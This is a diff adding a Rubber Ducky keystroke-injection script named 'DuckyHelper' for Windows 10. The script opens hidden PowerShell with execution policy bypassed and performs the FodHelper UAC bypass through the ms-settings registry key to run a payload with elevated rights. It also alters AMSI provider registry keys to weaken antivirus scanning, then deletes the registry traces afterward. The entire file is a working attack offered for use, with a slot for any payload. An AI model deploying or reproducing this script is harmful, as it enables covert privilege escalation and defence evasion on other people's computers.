@@ -1,0 +1,47 @@
+REM       DuckyHelper
+REM       Version 1.0
+REM       OS: Windows 10 
+REM       Author: 0iphor13
+
+REM       UAC bypass for privilege escalation (Method FodHelper)
+REM       AV will notify, but payload will still be executed
+REM       Payload configured in line 19 & 21 (cmd.exe) : $P="cmd.exe /c powershell New-Item 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFF}' -Force; Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}' -Recurse;[PAYLOAD]
+
+DELAY 1500
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -WindowStyle hidden -Exec Bypass
+DELAY 250
+ENTER
+
+DELAY 200
+STRING $P="cmd.exe /c powershell New-Item 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFF}' -Fo
+DELAY 100
+STRING rce; Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}' -Recurse; cmd.e
+DELAY 100
+STRING xe";Start-Sleep 1;New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force;;New-ItemProperty -Path "HKC
+DELAY 100
+STRING U:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force;Set-ItemProperty -Path "H
+DELAY 100
+STRING KCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $P -Force;Start-Process "C:\Windows\Sys
+DELAY 100
+STRING tem32\fodhelper.exe" -WindowStyle Hidden;Start-Sleep 3;Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+DELAY 100
+ENTER
+
+DELAY 5000
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -Exec Bypass
+DELAY 250
+ENTER
+
+DELAY 200
+STRING Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+DELAY 100
+ENTER
+
+DELAY 300
+STRING exit
+DELAY 100
+ENTER
